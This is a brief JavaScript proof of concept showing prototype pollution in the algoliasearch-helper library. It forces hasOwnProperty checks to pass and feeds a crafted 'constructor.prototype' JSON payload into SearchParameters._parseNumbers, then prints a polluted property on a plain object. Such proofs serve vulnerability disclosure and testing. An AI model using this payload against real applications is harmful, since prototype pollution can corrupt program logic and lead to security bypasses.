Object.prototype.hasOwnProperty.call = () => true;
const algohelp = require('algoliasearch-helper');
let payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
console.log({}.polluted);
algohelp.SearchParameters._parseNumbers(payload);
console.log({}.polluted);